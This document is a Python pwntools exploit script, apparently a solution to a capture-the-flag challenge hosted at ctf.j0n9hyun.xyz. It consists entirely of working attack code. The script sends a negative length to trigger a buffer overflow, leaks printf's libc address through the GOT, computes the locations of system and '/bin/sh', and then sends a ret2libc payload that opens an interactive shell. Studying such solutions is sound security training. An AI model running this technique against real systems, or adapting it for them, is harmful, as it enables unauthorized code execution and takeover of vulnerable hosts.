from pwn import * 

context.terminal = ['tmux', 'splitw', '-h']
breakpoint = {'vuln':0x080485b7}

r = remote('ctf.j0n9hyun.xyz', 3019)
#r = process('./pwning')
e = ELF('./pwning')

printf_plt = e.plt['printf']
printf_got = e.got['printf']
printf_offset = 0x049020
system_offset = 0x03a940
binsh_offset = 0x15902b
main = 0x080485b8

#gdb.attach(r, 'b *{}'.format(breakpoint['vuln']))

# Stage 1 Leak Libc
r.sendlineafter("? ", '-2')

payload = ''
payload += "A"*48
payload += p32(printf_plt)
payload += p32(main)
payload += p32(printf_got)

r.sendlineafter("!\n", payload)
r.recvuntil('\n')
printf = u32(r.recvn(4))

log.info("printf address: "+hex(printf))

libc_base = printf - printf_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

log.info("")
log.info("libc_base: "+hex(libc_base))
log.info("system: "+hex(system))
log.info("binsh: "+hex(binsh))

# Stage 2 Exploit
r.sendlineafter("? ", '-2')

payload = ''
payload += "A"*48
payload += p32(system)
payload += "BBBB"
payload += p32(binsh)

r.sendlineafter("!\n", payload)
r.interactive()
